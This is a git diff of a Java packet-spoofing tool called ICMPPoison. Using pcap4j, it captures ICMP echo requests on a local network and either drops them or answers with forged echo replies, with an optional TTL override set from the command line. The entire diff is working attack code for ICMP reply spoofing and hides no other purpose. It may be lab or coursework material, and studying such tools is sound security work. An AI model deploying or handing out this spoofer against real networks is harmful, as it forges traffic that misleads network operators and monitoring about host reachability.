@@ -16,10 +16,21 @@ import java.util.concurrent.TimeoutException;
 public class ICMPPoison {
 
     public static void main(String[] args) {
-        int packetsToCapture = 1;
-        if(args.length > 0){
-            packetsToCapture = Integer.parseInt(args[0]);
+        int packetsToCapture = 2;
+        int modifiedTTL = 0;
+        boolean dropPacket = false;
+
+        switch (args.length){
+            case 3:
+                dropPacket = Boolean.parseBoolean(args[2]);
+            case 2:
+                modifiedTTL = Integer.parseInt(args[1]);
+            case 1:
+                packetsToCapture = Integer.parseInt(args[0]);
+            case 0:
+                break;
         }
+
         PcapNetworkInterface networkInterface;
         try {
             networkInterface = MacAddressResolver.getAvailableNetworkInterface();
@@ -27,11 +38,10 @@ public class ICMPPoison {
             throw new RuntimeException(e);
         }
 
-        posionICMP(networkInterface, packetsToCapture);
-
+        poisonICMP(networkInterface, packetsToCapture, modifiedTTL, dropPacket);
     }
-
-    public static void posionICMP(PcapNetworkInterface networkInterface, int packetsToCapture) {
+    
+    public static void poisonICMP(PcapNetworkInterface networkInterface, int packetsToCapture, int modifiedTTL, boolean dropPacket) {
 
         int capturedICMPPackets = 0;
 
@@ -61,34 +71,26 @@ public class ICMPPoison {
                 packet = handle.getNextPacketEx();
 
                 if (packet.contains(IcmpV4EchoPacket.class)) {
-                    IcmpV4EchoPacket icmpV4EchoPacket = packet.get(IcmpV4EchoPacket.class);
 
-                    //EthernetPacket ethernetPacket = packet.get(EthernetPacket.class);
+                    IpV4Packet ipv4 = packet.get(IpV4Packet.class);
+                    System.out.println("Captured ICMP Echo from: " + ipv4.getHeader().getSrcAddr());
 
-                    //System.out.println(ethernetPacket);
+                    if(dropPacket){
+                        System.out.println("Reply dropped");
+                        capturedICMPPackets++;
+                        continue;
+                    }
 
-                    //System.out.println(icmpV4EchoPacket);
-
-                    //IpV4Packet ipv4 = packet.get(IpV4Packet.class);
-                    //System.out.println(ipv4);
-
-
-                    Packet fakeReply = buildFakeICMPReply(packet);
+                    Packet fakeReply = buildFakeICMPReply(packet, modifiedTTL);
 
                     handle.sendPacket(fakeReply);
 
+                    IpV4Packet ipv4Reply = fakeReply.get(IpV4Packet.class);
+
+                    System.out.println("Poisoned IMCP Reply sent to: " + ipv4Reply.getHeader().getDstAddr());
+
                     capturedICMPPackets++;
-
-
                 }
-
-                if (packet.contains(IcmpV4EchoReplyPacket.class)) {
-
-                    EthernetPacket ethernetPacket = packet.get(EthernetPacket.class);
-                    System.out.println(ethernetPacket);
-                }
-
-
             } catch (NotOpenException e) {
                 e.printStackTrace();
             } catch (EOFException e) {
@@ -96,12 +98,17 @@ public class ICMPPoison {
             } catch (PcapNativeException e) {
                 e.printStackTrace();
             } catch (TimeoutException e) {
-                continue;
             }
         }
     }
 
-    private static Packet buildFakeICMPReply(Packet icmpEchoPacket) {
+    /**
+     *
+     * @param icmpEchoPacket
+     * @param modifiedTTL 0 if no modification
+     * @return
+     */
+    private static Packet buildFakeICMPReply(Packet icmpEchoPacket, int modifiedTTL) {
 
         EthernetPacket ethernetHeader = icmpEchoPacket.get(EthernetPacket.class);
         IpV4Packet ipV4Packet = icmpEchoPacket.get(IpV4Packet.class);
@@ -117,7 +124,17 @@ public class ICMPPoison {
         int sequence = icmpV4EchoPacket.getHeader().getSequenceNumber();
         byte[] data = icmpV4EchoPacket.getPayload().getRawData();
 
-        return buildICMPReplyPacket(IcmpV4Type.ECHO_REPLY, destinationIP, sourceIP, destinationMac, sourceMac, identifier, sequence, data, 2);
+        int ttl = 0;
+
+        if(modifiedTTL == 0){
+            ttl = ipV4Packet.getHeader().getTtlAsInt();
+        } else {
+            ttl = modifiedTTL;
+        }
+
+        ipV4Packet.getHeader().getTtlAsInt();
+
+        return buildICMPReplyPacket(IcmpV4Type.ECHO_REPLY, destinationIP, sourceIP, destinationMac, sourceMac, identifier, sequence, data, ttl);
     }
 
     private static Packet buildICMPEchoPacket(IcmpV4Type icmpV4Type, Inet4Address sourceIP, Inet4Address destinationIP, MacAddress sourceMAC, MacAddress destinationMAC, int identifier, int sequence, byte[] data, int ttl) {
